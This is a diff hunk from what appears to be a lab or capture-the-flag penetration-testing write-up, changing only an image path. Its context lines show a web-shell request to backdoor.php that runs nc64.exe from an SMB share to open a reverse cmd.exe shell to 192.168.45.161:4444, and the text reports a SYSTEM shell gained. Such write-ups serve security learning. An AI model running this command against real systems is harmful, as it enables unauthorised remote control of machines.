@@ -74,7 +74,7 @@ Great! No all we need to do is get a reverse shell as the user. By setting up a 
 http://192.168.233.189:8080/backdoor.php?cmd=\\192.168.45.161\share\nc64.exe+-e+cmd.exe+192.168.45.161+4444
 ```
 
-<figure><img src="../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (157) (7).png" alt=""><figcaption></figcaption></figure>
 
 There is no privilege escalation, because we have successfully gotten a SYSTEM shell.&#x20;
 
